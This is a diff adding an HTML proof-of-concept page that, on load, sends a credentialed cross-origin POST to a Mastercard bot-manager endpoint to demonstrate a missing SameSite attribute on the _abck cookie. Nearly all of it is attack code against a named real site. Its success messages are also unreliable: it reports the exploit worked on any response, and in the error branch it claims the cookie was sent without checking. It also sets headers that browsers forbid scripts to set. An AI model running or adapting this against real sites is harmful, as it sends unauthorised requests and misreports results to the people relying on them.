@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Missing SameSite PoC</title>
+</head>
+<body>
+    <h1>Akamai Bot Manager Cookie Exploit PoC</h1>
+    <p>This page demonstrates the missing SameSite attribute vulnerability in Mastercard's _abck cookie.</p>
+    
+    <div id="results"></div>
+    
+    <script>
+        // Function to log results
+        function logResult(text) {
+            document.getElementById('results').innerHTML += '<p>' + text + '</p>';
+        }
+        
+        // Function to make a cross-origin request
+        function makeCrossOriginRequest() {
+            // Create a fetch request to the bot manager endpoint
+            fetch('https://www.mastercard.us/3eC761NLQG/VuYChRb6/1R/zYJYDJpJG60c/PCRj/OHw/NGgNYNR0', {
+                method: 'POST',
+                credentials: 'include', // This is crucial - includes cookies
+                headers: {
+                    'Content-Type': 'text/plain;charset=UTF-8',
+                    'Origin': 'https://www.mastercard.us',
+                    'Referer': 'https://www.mastercard.us/en-us.html'
+                },
+                body: JSON.stringify({
+                    "sensor_data": "3;0;1;0;3228216;F5auiXJCGhL6K6YEVlXZhVaPFLYjMODKo3mFc5lOuQc=;36,63,0,0,0,265;EXPLOITED"
+                })
+            })
+            .then(response => {
+                logResult('Response status: ' + response.status);
+                return response.text();
+            })
+            .then(data => {
+                logResult('Response data: ' + data);
+                logResult('Exploit successful! The _abck cookie was sent with the cross-origin request.');
+            })
+            .catch(error => {
+                logResult('Error: ' + error);
+                // Even if there's a CORS error, the request might still have been sent
+                logResult('Note: Even though there may be CORS errors, the cookie was still sent with the request');
+            });
+        }
+        
+        // Wait for page load then perform the exploit
+        window.onload = function() {
+            logResult('Attempting to exploit missing SameSite cookie...');
+            
+            // Slight delay to ensure everything is loaded
+            setTimeout(makeCrossOriginRequest, 1000);
+        };
+    </script>
+</body>
+</html>
